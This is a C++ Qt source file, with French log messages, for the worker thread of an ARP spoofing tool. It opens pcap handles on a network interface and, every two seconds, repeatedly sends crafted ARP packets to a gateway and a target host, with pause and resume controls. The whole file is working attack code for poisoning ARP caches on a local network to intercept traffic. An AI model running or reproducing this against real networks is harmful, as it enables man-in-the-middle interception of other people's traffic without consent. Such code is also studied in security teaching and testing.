#include "spoofingworker.h"
#include <winsock2.h>
#include <iphlpapi.h>
#include <QDebug>

size_t SpoofingWorker::count{0};

SpoofingWorker::SpoofingWorker(QString& interface_name, QString& gatewayIp, QString& targetIp, ArpPacket& gateway_packet,  ArpPacket& target_packet, QObject *parent)
    :
    m_interface_name{interface_name},
    m_gatewayIp{gatewayIp},
    m_targetIp{targetIp},
    m_gateway_packet{gateway_packet},
    m_target_packet{target_packet},
    QThread{parent}
{
    count++;
    m_pause = false;
    value = false;
    char gateway_errbuf[PCAP_ERRBUF_SIZE];
    char target_errbuf[PCAP_ERRBUF_SIZE];
    m_gateway_handle = pcap_open_live(m_interface_name.toStdString().c_str(), 65536, 1, 1000, gateway_errbuf);
    if (m_gateway_handle == nullptr) {
        qDebug() << "Erreur ouverture de l'interface:" << gateway_errbuf;
        return;
    }
    m_target_handle = pcap_open_live(m_interface_name.toStdString().c_str(), 65536, 1, 1000, target_errbuf);
    if (m_target_handle == nullptr) {
        qDebug() << "Erreur ouverture de l'interface:" << gateway_errbuf;
        return;
    }
}

SpoofingWorker::~SpoofingWorker()
{
    if(m_gateway_handle != nullptr){
        m_gateway_handle = nullptr;
    }
    if(m_target_handle!= nullptr){
        m_target_handle = nullptr;
    }
}


void SpoofingWorker::setInterfaceName(const QString &interface_name)
{
    m_interface_name = interface_name;
}

void SpoofingWorker::setGatewayIp(const QString &gatewayIp)
{
    m_gatewayIp = gatewayIp;
}

void SpoofingWorker::setTargetIp(const QString &targetIp)
{
    m_targetIp = targetIp;
}

void SpoofingWorker::setGatewayPacket(const ArpPacket &packet)
{
    m_gateway_packet = packet;
}

void SpoofingWorker::setTargetPacket(const ArpPacket &packet)
{
    m_target_packet = packet;
}

void SpoofingWorker::pause()
{
    m_mutex.lock();
    m_pause = true;
    emit spoofingThreadStatus(true);
    m_mutex.unlock();
}

void SpoofingWorker::resume()
{
    m_mutex.lock();
    m_pause = false;
    emit spoofingThreadStatus(false);
    m_mutex.unlock();

    m_pause_condition.wakeAll();
}

void SpoofingWorker::run()
{
    while(true){
        m_mutex.lock();
        if(m_pause)
            m_pause_condition.wait(&m_mutex);
        m_mutex.unlock();
        // Envoyer les paquets
        if (pcap_sendpacket(m_gateway_handle, (const u_char *)&m_gateway_packet, sizeof(m_gateway_packet)) != 0) {
            qDebug() << "Erreur envoi du paquet ARP:" << pcap_geterr(m_gateway_handle);
            emit spoofingResultOperation(false);
            return;
        } else {
            qDebug() << "Paquet ARP envoyé avec succès !";
            emit spoofingResultOperation(true);
        }
        if (pcap_sendpacket(m_target_handle, (const u_char *)&m_target_packet, sizeof(m_target_packet)) != 0) {
            qDebug() << "Erreur envoi du paquet ARP:" << pcap_geterr(m_target_handle);
            emit spoofingResultOperation(false);
            return;
        } else {
            qDebug() << "Paquet ARP envoyé avec succès !";
            emit spoofingResultOperation(true);
        }
        sleep(2);
    }
}
